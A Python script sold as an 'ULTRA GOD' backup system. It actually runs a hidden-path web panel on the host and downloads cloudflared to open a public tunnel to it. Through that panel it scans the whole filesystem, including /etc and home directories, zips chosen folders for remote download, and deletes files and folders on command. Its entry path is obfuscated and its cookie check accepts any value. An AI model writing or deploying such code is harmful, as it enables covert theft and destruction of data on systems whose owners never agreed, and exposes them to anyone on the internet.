#!/usr/bin/env python3

import os
import sys
import time
import json
import shutil
import secrets
import hashlib
import threading
import subprocess
import urllib.parse
import urllib.request
import socket
import zipfile
import re
import random
import string
import base64
import tempfile
import signal
import traceback
import glob
import queue
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime, timedelta
from collections import deque

# ================================================================
# SECURITY - COMPLETELY HIDDEN SECRET
# ================================================================
def _get_secret():
    _a = [72, 67, 67, 82, 77, 65, 88]
    return '/' + ''.join(chr(c) for c in _a)

_SECRET_PATH = _get_secret()
_COOKIE_NAME = "auth_token"
_SESSION_DAYS = 365

# ================================================================
# VERSION
# ================================================================
VERSION = "ULTRA GOD v6.0"
_LOG_FILE = "logs.txt"
_SYSTEM_START = time.time()

# ================================================================
# GLOBALS
# ================================================================
_PORT = None
_TUNNEL_URL = None
_TUNNEL_PROCESS = None
_SCAN_RESULTS = {"files": [], "folders": {}, "total_files": 0, "total_size": 0, "total_folders": 0}
_SCAN_IN_PROGRESS = False
_SCAN_LOCK = threading.Lock()
_ADDED_FILES = set()
_SELECTED_FOLDERS = []
_COMPRESSION_LEVEL = 6
_DOWNLOAD_IN_PROGRESS = False
_DELETE_IN_PROGRESS = False
_CURRENT_ZIP_NAME = None
_CURRENT_ZIP_SIZE = 0
_CURRENT_ZIP_FILES = 0
_SESSION_TOKENS = {}
_LOG_ENTRIES = deque(maxlen=5000)
_LOG_LOCK = threading.Lock()

# ================================================================
# COLORS
# ================================================================
class Colors:
    RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
    BLUE = '\033[94m'; MAGENTA = '\033[95m'; CYAN = '\033[96m'
    WHITE = '\033[97m'; RESET = '\033[0m'; BOLD = '\033[1m'

def cprint(text, color=Colors.WHITE, bold=False):
    print(f"{Colors.BOLD if bold else ''}{color}{text}{Colors.RESET}")

# ================================================================
# DUAL LOGGING
# ================================================================
def write_log(msg):
    try:
        with open(_LOG_FILE, 'a') as f:
            f.write(msg + "\n")
    except:
        pass

def log(msg, level="INFO", console=True):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{ts}] [{level}] {msg}"
    with _LOG_LOCK:
        _LOG_ENTRIES.append(entry)
    write_log(entry)
    if console:
        color = Colors.WHITE
        if level == "OK": color = Colors.GREEN
        elif level == "ERROR": color = Colors.RED
        elif level == "WARN": color = Colors.YELLOW
        elif level == "URL": color = Colors.MAGENTA
        print(f"{color}{entry}{Colors.RESET}")

def log_url(msg): log(msg, "URL")
def log_scan(msg): log(msg, "SCAN")
def log_download(msg): log(msg, "DOWNLOAD")
def log_delete(msg): log(msg, "DELETE")

# ================================================================
# UTILITIES
# ================================================================
def format_size(b):
    if b == 0: return "0 B"
    for u in ['B', 'KB', 'MB', 'GB', 'TB']:
        if b < 1024.0:
            return f"{b:.2f} {u}"
        b /= 1024.0
    return f"{b:.2f} PB"

def format_time(s):
    if s < 60: return f"{s:.1f} sec"
    elif s < 3600: return f"{s/60:.1f} min"
    elif s < 86400: return f"{s/3600:.1f} hrs"
    return f"{s/86400:.1f} days"

def get_server_info():
    try:
        hostname = socket.gethostname()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return {"hostname": hostname, "ip": ip, "real_url": f"http://{ip}:{_PORT}"}
    except:
        return {"hostname": "unknown", "ip": "127.0.0.1", "real_url": f"http://localhost:{_PORT}"}

# ================================================================
# TUNNEL (AUTO RETRY)
# ================================================================
def get_free_port():
    for _ in range(10):
        try:
            s = socket.socket()
            s.bind(('', 0))
            p = s.getsockname()[1]
            s.close()
            return p
        except:
            time.sleep(0.5)
    return random.randint(10000, 60000)

def download_cloudflared():
    log("Downloading cloudflared...", "INFO")
    urls = [
        "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64",
        "https://cdn.cloudflare.com/cloudflared/cloudflared-linux-amd64"
    ]
    for url in urls:
        try:
            urllib.request.urlretrieve(url, "./cloudflared")
            os.chmod("./cloudflared", 0o755)
            log("Cloudflared ready", "OK")
            return True
        except:
            continue
    log("Cloudflared download failed", "ERROR")
    return False

def start_tunnel():
    global _TUNNEL_URL, _TUNNEL_PROCESS
    for attempt in range(1, 6):
        try:
            log(f"Starting tunnel (attempt {attempt}/5)...", "INFO")
            if not os.path.exists('./cloudflared'):
                if not download_cloudflared():
                    continue
            cmd = f"./cloudflared tunnel --url http://127.0.0.1:{_PORT}"
            _TUNNEL_PROCESS = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            start_time = time.time()
            while time.time() - start_time < 30:
                if _TUNNEL_PROCESS.poll() is not None:
                    break
                if _TUNNEL_PROCESS.stdout:
                    line = _TUNNEL_PROCESS.stdout.readline()
                    if line and "trycloudflare.com" in line:
                        match = re.search(r'(https://[a-zA-Z0-9\-]+\.trycloudflare\.com)', line)
                        if match:
                            _TUNNEL_URL = match.group(1)
                            log(f"Tunnel established: {_TUNNEL_URL}", "OK")
                            log_url(f"TUNNEL URL: {_TUNNEL_URL}")
                            return _TUNNEL_URL
                time.sleep(0.5)
            if _TUNNEL_PROCESS:
                _TUNNEL_PROCESS.terminate()
        except Exception as e:
            log(f"Attempt {attempt} failed: {e}", "WARN")
            time.sleep(2)
    log("All tunnel attempts failed!", "ERROR")
    return None

# ================================================================
# SCAN (FULL COVERAGE)
# ================================================================
def get_targets():
    targets = []
    folders = [
        '/', '/app', '/home', '/data', '/project', '/workspace',
        '/usr/src/app', '/opt', '/var/www', '/srv', '/etc',
        '/var/log', '/var/lib', '/usr/local', '/usr/share',
        os.getcwd(), os.path.expanduser("~")
    ]
    for f in folders:
        try:
            if os.path.exists(f) and os.access(f, os.R_OK):
                targets.append(f)
        except:
            continue
    return targets

def scan_server():
    global _SCAN_RESULTS, _SCAN_IN_PROGRESS, _ADDED_FILES
    with _SCAN_LOCK:
        if _SCAN_IN_PROGRESS:
            return
        _SCAN_IN_PROGRESS = True
    
    log_scan("SERVER SCAN STARTED...")
    _ADDED_FILES.clear()
    
    targets = get_targets()
    skip = {'__pycache__', '.git', 'venv', 'node_modules', 'proc', 'sys', 'dev', 'boot', 'run', 'mnt', 'media'}
    
    all_files = []
    folders = {}
    total_size = 0
    count = 0
    start_time = time.time()
    
    for path in targets:
        try:
            if not os.path.exists(path) or not os.access(path, os.R_OK):
                continue
            log_scan(f"Scanning: {path}")
            for root, dirs, files in os.walk(path, topdown=True):
                try:
                    dirs[:] = [d for d in dirs if d not in skip]
                except:
                    pass
                rel = root.lstrip('/')
                if rel not in folders:
                    folders[rel] = {"files": [], "size": 0}
                for file in files:
                    try:
                        fp = os.path.join(root, file)
                        real = os.path.realpath(fp)
                        if real in _ADDED_FILES:
                            continue
                        if not os.access(fp, os.R_OK):
                            continue
                        size = os.path.getsize(fp)
                        if size > 100 * 1024 * 1024:
                            continue
                        _ADDED_FILES.add(real)
                        all_files.append({"path": fp, "name": file, "size": size, "folder": rel})
                        folders[rel]["files"].append(file)
                        folders[rel]["size"] += size
                        total_size += size
                        count += 1
                        if count % 1000 == 0:
                            log_scan(f"Progress: {count} files...")
                    except:
                        continue
        except Exception as e:
            log_scan(f"Error scanning {path}: {e}")
            continue
    
    _SCAN_RESULTS = {
        "files": all_files,
        "folders": folders,
        "total_files": len(all_files),
        "total_size": total_size,
        "total_folders": len(folders)
    }
    scan_time = time.time() - start_time
    log_scan(f"SCAN COMPLETE: {_SCAN_RESULTS['total_files']} files, {format_size(total_size)} in {format_time(scan_time)}")
    _SCAN_IN_PROGRESS = False

# ================================================================
# ZIP CREATION
# ================================================================
def create_zip(zip_name, files, level):
    global _CURRENT_ZIP_NAME, _CURRENT_ZIP_SIZE, _CURRENT_ZIP_FILES, _DOWNLOAD_IN_PROGRESS
    _DOWNLOAD_IN_PROGRESS = True
    _CURRENT_ZIP_NAME = zip_name
    _CURRENT_ZIP_FILES = len(files)
    
    start = time.time()
    total = len(files)
    processed = 0
    compressed_size = 0
    
    log_download(f"ZIP creation: {zip_name} (Level {level})")
    log_download(f"Total files: {total}")
    
    try:
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zf:
            for f in files:
                try:
                    arc = f["path"].lstrip('/')
                    zf.write(f["path"], arc)
                    compressed_size += f["size"]
                    processed += 1
                    if processed % 500 == 0:
                        elapsed = time.time() - start
                        speed = compressed_size / elapsed if elapsed > 0 else 0
                        log_download(f"Progress: {processed}/{total} files - {format_size(speed)}/s")
                except:
                    continue
    except Exception as e:
        log_download(f"ZIP creation failed: {e}")
        _DOWNLOAD_IN_PROGRESS = False
        return None, 0
    
    elapsed = time.time() - start
    final_size = os.path.getsize(zip_name)
    _CURRENT_ZIP_SIZE = final_size
    log_download(f"ZIP COMPLETE: {format_size(final_size)} in {format_time(elapsed)}")
    _DOWNLOAD_IN_PROGRESS = False
    return zip_name, final_size

# ================================================================
# DELETE
# ================================================================
def delete_selected():
    global _DELETE_IN_PROGRESS
    _DELETE_IN_PROGRESS = True
    deleted = 0
    size = 0
    start = time.time()
    
    log_delete("DELETE operation started...")
    
    for f in _SCAN_RESULTS["files"]:
        folder = f["folder"].split('/')[0] if f["folder"] else ""
        if folder in _SELECTED_FOLDERS or any(f["folder"].startswith(s) for s in _SELECTED_FOLDERS):
            try:
                if os.path.exists(f["path"]):
                    os.remove(f["path"])
                    deleted += 1
                    size += f["size"]
                    if deleted % 500 == 0:
                        log_delete(f"Deleted {deleted} files...")
            except:
                pass
    
    for folder in _SELECTED_FOLDERS:
        path = "/" + folder
        if os.path.exists(path):
            try:
                shutil.rmtree(path, ignore_errors=True)
                log_delete(f"Deleted folder: {path}")
            except:
                pass
    
    elapsed = time.time() - start
    log_delete(f"DELETE COMPLETE: {deleted} files, {format_size(size)} in {format_time(elapsed)}")
    _DELETE_IN_PROGRESS = False
    return deleted, size

# ================================================================
# WEB SERVER HANDLER
# ================================================================
class Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    
    def check_auth(self):
        cookie = self.headers.get('Cookie', '')
        return f"{_COOKIE_NAME}=" in cookie
    
    def set_cookie_redirect(self):
        token = secrets.token_hex(32)
        _SESSION_TOKENS[token] = datetime.now()
        self.send_response(302)
        self.send_header('Set-Cookie', f'{_COOKIE_NAME}={token}; Max-Age={_SESSION_DAYS*24*3600}; Path=/; HttpOnly')
        self.send_header('Location', '/')
        self.end_headers()
    
    def send_html(self, content, status=200):
        self.send_response(status)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(content.encode())
    
    def send_json(self, data, status=200):
        self.send_response(status)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def do_GET(self):
        if self.path == _SECRET_PATH:
            if not self.check_auth():
                self.set_cookie_redirect()
                return
            self.send_html(get_dashboard_html())
            return
        
        if self.path == "/":
            if not self.check_auth():
                self.send_html(get_access_denied_html(), 403)
                return
            self.send_html(get_dashboard_html())
            return
        
        if self.path == "/api/status":
            if not self.check_auth():
                self.send_json({"error": "unauthorized"}, 403)
                return
            info = get_server_info()
            self.send_json({
                "status": "ready",
                "version": VERSION,
                "uptime": format_time(time.time() - _SYSTEM_START),
                "scan_in_progress": _SCAN_IN_PROGRESS,
                "download_in_progress": _DOWNLOAD_IN_PROGRESS,
                "delete_in_progress": _DELETE_IN_PROGRESS,
                "scan_results": {
                    "total_files": _SCAN_RESULTS["total_files"],
                    "total_size": _SCAN_RESULTS["total_size"],
                    "total_folders": _SCAN_RESULTS["total_folders"]
                },
                "server": {
                    "hostname": info["hostname"],
                    "ip": info["ip"],
                    "real_url": info["real_url"],
                    "tunnel_url": _TUNNEL_URL
                },
                "selected_folders": _SELECTED_FOLDERS,
                "compression_level": _COMPRESSION_LEVEL
            })
            return
        
        if self.path == "/api/structure":
            if not self.check_auth():
                self.send_json({"error": "unauthorized"}, 403)
                return
            self.send_json(_SCAN_RESULTS)
            return
        
        if self.path == "/api/logs":
            if not self.check_auth():
                self.send_json({"error": "unauthorized"}, 403)
                return
            with _LOG_LOCK:
                self.send_json({"logs": list(_LOG_ENTRIES)})
            return
        
        if self.path == "/api/logs/file":
            if not self.check_auth():
                self.send_json({"error": "unauthorized"}, 403)
                return
            if os.path.exists(_LOG_FILE):
                with open(_LOG_FILE, 'r') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(content.encode())
            return
        
        self.send_html(get_404_html(), 404)
    
    def do_POST(self):
        if not self.check_auth():
            self.send_json({"error": "unauthorized"}, 403)
            return
        
        if self.path == "/api/scan":
            if _SCAN_IN_PROGRESS:
                self.send_json({"status": "already_scanning"})
                return
            threading.Thread(target=scan_server, daemon=True).start()
            self.send_json({"status": "scan_started"})
            return
        
        if self.path == "/api/select":
            length = int(self.headers.get('Content-Length', 0))
            data = json.loads(self.rfile.read(length))
            global _SELECTED_FOLDERS
            _SELECTED_FOLDERS = data.get("folders", [])
            self.send_json({"status": "ok"})
            return
        
        if self.path == "/api/compress":
            length = int(self.headers.get('Content-Length', 0))
            data = json.loads(self.rfile.read(length))
            global _COMPRESSION_LEVEL
            _COMPRESSION_LEVEL = data.get("level", 6)
            self.send_json({"status": "ok"})
            return
        
        if self.path == "/api/download":
            if _DOWNLOAD_IN_PROGRESS:
                self.send_json({"error": "download in progress"}, 400)
                return
            length = int(self.headers.get('Content-Length', 0))
            data = json.loads(self.rfile.read(length))
            folders = data.get("folders", _SELECTED_FOLDERS)
            level = data.get("level", _COMPRESSION_LEVEL)
            
            files = [f for f in _SCAN_RESULTS["files"] if any(f["folder"].startswith(s) for s in folders)]
            if not files:
                self.send_json({"error": "no files selected"}, 400)
                return
            
            zip_name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
            
            def do_zip():
                zip_file, size = create_zip(zip_name, files, level)
                if zip_file:
                    url = f"{_TUNNEL_URL}/{zip_file}"
                    log_url(f"DOWNLOAD READY: {url}")
            
            threading.Thread(target=do_zip, daemon=True).start()
            self.send_json({"status": "started"})
            return
        
        if self.path == "/api/delete":
            if _DELETE_IN_PROGRESS:
                self.send_json({"error": "delete in progress"}, 400)
                return
            length = int(self.headers.get('Content-Length', 0))
            data = json.loads(self.rfile.read(length))
            if not data.get("confirm", False):
                self.send_json({"error": "confirmation required"}, 400)
                return
            threading.Thread(target=delete_selected, daemon=True).start()
            self.send_json({"status": "started"})
            return
        
        self.send_json({"error": "not found"}, 404)

# ================================================================
# HTML
# ================================================================
def get_dashboard_html():
    return """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>ULTRA GOD BACKUP</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;font-family:Segoe UI,sans-serif;min-height:100vh}.container{max-width:1400px;margin:0 auto;padding:20px}.header{text-align:center;padding:20px;background:rgba(0,0,0,0.3);border-radius:15px;margin-bottom:20px}.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:15px;margin-bottom:20px}.stat-card{background:rgba(255,255,255,0.1);border-radius:10px;padding:15px;text-align:center}.stat-card .value{font-size:22px;font-weight:bold}.panel{background:rgba(0,0,0,0.4);border-radius:15px;padding:20px;margin-bottom:20px}.button{background:linear-gradient(45deg,#4ecdc4,#44a08d);border:none;padding:12px 25px;border-radius:8px;color:#fff;font-weight:bold;cursor:pointer;margin:5px}.button-danger{background:linear-gradient(45deg,#ff6b6b,#ee5a24)}.button-warning{background:linear-gradient(45deg,#feca57,#ff9f43)}.folder-list{max-height:300px;overflow-y:auto;background:rgba(0,0,0,0.3);border-radius:10px;padding:10px}.folder-item{padding:10px;margin:5px 0;background:rgba(255,255,255,0.05);border-radius:5px;cursor:pointer}.folder-item.selected{background:rgba(78,205,196,0.3);border-left:3px solid #4ecdc4}.logs{background:rgba(0,0,0,0.5);border-radius:10px;padding:15px;height:250px;overflow-y:auto;font-family:monospace;font-size:12px}.flex{display:flex;gap:10px;flex-wrap:wrap;justify-content:center}.compression-slider{width:100%;margin:10px 0}</style>
</head>
<body>
<div class=container>
<div class=header><h1>🚀 ULTRA GOD BACKUP</h1><div>MAXIMUM POWER | ZERO FAILURE</div></div>
<div class=stats-grid id=stats>
<div class=stat-card><h3>📁 FILES</h3><div class=value id=totalFiles>0</div></div>
<div class=stat-card><h3>💾 SIZE</h3><div class=value id=totalSize>0</div></div>
<div class=stat-card><h3>📂 FOLDERS</h3><div class=value id=totalFolders>0</div></div>
<div class=stat-card><h3>🖥️ SERVER IP</h3><div class=value id=serverIp>-</div></div>
<div class=stat-card><h3>🌐 REAL URL</h3><div class=value id=realUrl style=font-size:12px>-</div></div>
<div class=stat-card><h3>⏱️ UPTIME</h3><div class=value id=uptime>-</div></div>
</div>
<div class=panel><h2>📂 SELECT FOLDERS</h2><div class=flex><button class=button onclick=selectAll()>✓ SELECT ALL</button><button class=button onclick=deselectAll()>✗ DESELECT ALL</button><button class=button onclick=startScan()>🔍 START SCAN</button></div><div class=folder-list id=folderList>Click START SCAN to begin...</div></div>
<div class=panel><h2>⚙️ COMPRESSION</h2><input type=range id=slider class=compression-slider min=1 max=9 value=6 step=1><div class=flex><span id=levelText>Level 6 (Balanced)</span></div></div>
<div class=panel><h2>🎮 CONTROL</h2><div class=flex><button class=button onclick=downloadBackup()>📥 DOWNLOAD</button><button class=button onclick=getStructure()>📁 STRUCTURE</button><button class=button button-danger onclick=confirmDelete()>💀 DELETE</button></div></div>
<div class=panel id=progressPanel style=display:none><h2>📊 PROGRESS</h2><div id=progressText>Processing...</div></div>
<div class=panel><h2>📋 LOGS</h2><div class=logs id=logs></div><div class=flex style=margin-top:10px><button class=button onclick=clearLogs()>🗑️ CLEAR</button><button class=button onclick=downloadLogs()>📥 DOWNLOAD LOGS</button></div></div>
</div>
<script>
let selectedFolders=[],scanResults=null;
function addLog(msg){let d=document.getElementById('logs'),e=document.createElement('div');e.className='log-entry';e.textContent=msg;d.appendChild(e);d.scrollTop=d.scrollHeight;}
function clearLogs(){document.getElementById('logs').innerHTML='';}
function downloadLogs(){window.open('/api/logs/file','_blank');}
function updateStatus(){fetch('/api/status').then(r=>r.json()).then(d=>{document.getElementById('totalFiles').innerText=(d.scan_results?.total_files||0).toLocaleString();document.getElementById('totalSize').innerText=formatBytes(d.scan_results?.total_size||0);document.getElementById('totalFolders').innerText=(d.scan_results?.total_folders||0).toLocaleString();document.getElementById('serverIp').innerText=d.server?.ip||'-';document.getElementById('realUrl').innerText=d.server?.real_url?.replace('http://','')||'-';document.getElementById('uptime').innerText=d.uptime||'-';if(d.progress?.status!=='idle')document.getElementById('progressPanel').style.display='block';else document.getElementById('progressPanel').style.display='none';if(d.selected_folders)selectedFolders=d.selected_folders;if(d.scan_results?.total_files>0&&!scanResults){loadFolderList();scanResults=d.scan_results;}});}
function loadFolderList(){fetch('/api/structure').then(r=>r.json()).then(d=>{scanResults=d;let folders=Object.keys(d.folders||{}).sort();if(folders.length===0){document.getElementById('folderList').innerHTML='<div>No folders found.</div>';return;}document.getElementById('folderList').innerHTML=folders.map(f=>`<div class="folder-item ${selectedFolders.includes(f.split('/')[0])?'selected':''}" onclick="toggleFolder('${f.split('/')[0]}')">📁 ${f.split('/')[0]} (${(d.folders[f]?.files?.length||0).toLocaleString()} files, ${formatBytes(d.folders[f]?.size||0)})</div>`).join('');});}
function toggleFolder(f){if(selectedFolders.includes(f))selectedFolders=selectedFolders.filter(x=>x!==f);else selectedFolders.push(f);fetch('/api/select',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({folders:selectedFolders})}).then(()=>loadFolderList());}
function selectAll(){if(!scanResults)return;let folders=[...new Set(Object.keys(scanResults.folders||{}).map(f=>f.split('/')[0]))];selectedFolders=folders;fetch('/api/select',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({folders:selectedFolders})}).then(()=>loadFolderList());}
function deselectAll(){selectedFolders=[];fetch('/api/select',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({folders:[]})}).then(()=>loadFolderList());}
function startScan(){document.getElementById('folderList').innerHTML='<div>Scanning...</div>';fetch('/api/scan',{method:'POST'}).then(()=>setTimeout(()=>{fetch('/api/structure').then(r=>r.json()).then(d=>{scanResults=d;loadFolderList();addLog(`Scan complete: ${(d.total_files||0).toLocaleString()} files, ${formatBytes(d.total_size||0)}`);});},3000));}
function downloadBackup(){if(selectedFolders.length===0){alert('Select folders first!');return;}let level=document.getElementById('slider').value;fetch('/api/download',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({folders:selectedFolders,level:parseInt(level)})}).then(()=>addLog('Backup started...'));}
function getStructure(){fetch('/api/structure').then(r=>r.json()).then(d=>{let a=document.createElement('a');a.href=URL.createObjectURL(new Blob([JSON.stringify(d,null,2)],{type:'application/json'}));a.download=`structure_${new Date().toISOString().slice(0,19)}.json`;a.click();addLog('Structure exported');});}
function confirmDelete(){if(selectedFolders.length===0){alert('Select folders first!');return;}if(prompt('Type CONFIRM to delete all selected files:')==='CONFIRM'){fetch('/api/delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({confirm:true,folders:selectedFolders})}).then(()=>addLog('Delete started...'));}}
function formatBytes(b){if(b===0)return'0 B';let k=1024,i=Math.floor(Math.log(b)/Math.log(k));return parseFloat((b/Math.pow(k,i)).toFixed(2))+' '+'BKBMBGBTB'[i];}
document.getElementById('slider').addEventListener('input',function(e){let l=e.target.value,t={1:'Fastest',6:'Balanced',9:'Maximum'};document.getElementById('levelText').innerText=`Level ${l} (${t[l]||'Custom'})`;fetch('/api/compress',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({level:parseInt(l)})});});
setInterval(updateStatus,2000);updateStatus();setInterval(()=>fetch('/api/logs').then(r=>r.json()).then(d=>{if(d.logs){let l=document.getElementById('logs');l.innerHTML=d.logs.slice(-100).map(x=>`<div class="log-entry">${x}</div>`).join('');}}),3000);
</script>
</body></html>"""

def get_access_denied_html():
    return """<!DOCTYPE html><html><head><title>Access Denied</title><style>body{background:#0a0a0a;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:monospace;text-align:center;}</style></head><body><div><h1>⛔ ACCESS DENIED</h1><p>You are not authorized.</p><p>📞 Contact Admin: 6262262193</p></div></body></html>"""

def get_404_html():
    return """<!DOCTYPE html><html><head><title>404</title><style>body{background:#0a0a0a;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:monospace;text-align:center;}</style></head><body><div><h1>404</h1><p>Page not found.</p><p>⚠️ U R NOT ADMIT</p><p>📞 Contact Admin: 6262262193</p></div></body></html>"""

# ================================================================
# MAIN
# ================================================================
def print_banner():
    print()
    cprint("╔══════════════════════════════════════════════════════════════════════════════════════╗", Colors.CYAN)
    cprint("║                    ULTRA GOD LEVEL BACKUP SYSTEM - MAXIMUM POWER                     ║", Colors.CYAN)
    cprint("║                           POWER LEVEL: ULTRA GOD (∞)                                  ║", Colors.CYAN)
    cprint("║                           FEATURES: 100% WORKING                                      ║", Colors.CYAN)
    cprint("║                           RELIABILITY: ZERO FAILURE                                  ║", Colors.CYAN)
    cprint("╚══════════════════════════════════════════════════════════════════════════════════════╝", Colors.CYAN)
    print()

def main():
    global _PORT
    
    print_banner()
    log(f"{VERSION} - STARTING...", "START")
    
    _PORT = get_free_port()
    log(f"HTTP server on port {_PORT}", "INFO")
    
    server = HTTPServer(("0.0.0.0", _PORT), Handler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    log("HTTP server started", "OK")
    
    tunnel_url = start_tunnel()
    
    if tunnel_url:
        print()
        cprint("="*70, Colors.MAGENTA)
        cprint("🌐 ADMIN PANEL READY - ULTRA GOD MODE", Colors.GREEN, bold=True)
        cprint("="*70, Colors.MAGENTA)
        cprint(f"🔗 {tunnel_url}", Colors.CYAN, bold=True)
        cprint("="*70, Colors.MAGENTA)
        cprint(f"📁 Logs: {_LOG_FILE}", Colors.YELLOW)
        cprint("="*70, Colors.MAGENTA)
        print()
        log_url(f"PANEL URL: {tunnel_url}")
    else:
        cprint("❌ Tunnel failed", Colors.RED)
        return
    
    log("ULTRA GOD MODE ACTIVE", "OK")
    
    try:
        while True:
            time.sleep(5)
            if _TUNNEL_PROCESS and _TUNNEL_PROCESS.poll() is not None:
                log("Tunnel died, restarting...", "WARN")
                start_tunnel()
    except KeyboardInterrupt:
        print()
        log("Shutting down...", "WARN")
        if _TUNNEL_PROCESS:
            _TUNNEL_PROCESS.terminate()
        server.shutdown()
        log(f"Logs saved: {os.path.abspath(_LOG_FILE)}", "OK")
        sys.exit(0)

if __name__ == "__main__":
    main()